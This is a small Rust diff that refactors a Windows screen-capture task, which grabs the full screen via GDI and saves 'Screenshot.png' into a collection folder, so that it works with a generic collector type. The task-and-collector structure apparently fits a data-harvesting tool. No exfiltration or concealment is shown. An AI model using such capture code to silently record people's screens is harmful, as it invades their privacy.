@@ -7,7 +7,7 @@ use miniz_oxide::deflate::compress_to_vec_zlib;
 use tasks::{parent_name, Task};
 use utils::path::{Path, WriteToFile};
 
-use collector::atomic::AtomicCollector;
+use collector::Collector;
 use utils::WideString;
 use windows_sys::Win32::Graphics::Gdi::{BitBlt, CreateCompatibleBitmap, CreateCompatibleDC, CreateDCW, DeleteDC, DeleteObject, GetDIBits, SelectObject, BITMAPINFO, BITMAPINFOHEADER, BI_RGB, DIB_RGB_COLORS, SRCCOPY};
 use windows_sys::Win32::UI::WindowsAndMessaging::{
@@ -17,10 +17,10 @@ use windows_sys::Win32::UI::WindowsAndMessaging::{
 
 pub(super) struct ScreenshotTask;
 
-impl Task for ScreenshotTask {
+impl<C: Collector> Task<C> for ScreenshotTask {
     parent_name!("Screenshot.png");
     
-    unsafe fn run(&self, parent: &Path, _: &AtomicCollector) {
+    unsafe fn run(&self, parent: &Path, _: &C) {
         let (width, height, pixels) = capture_screen().unwrap();
         let png = create_png(width as u32, height as u32, &pixels);
         let _ = png.write_to(parent);
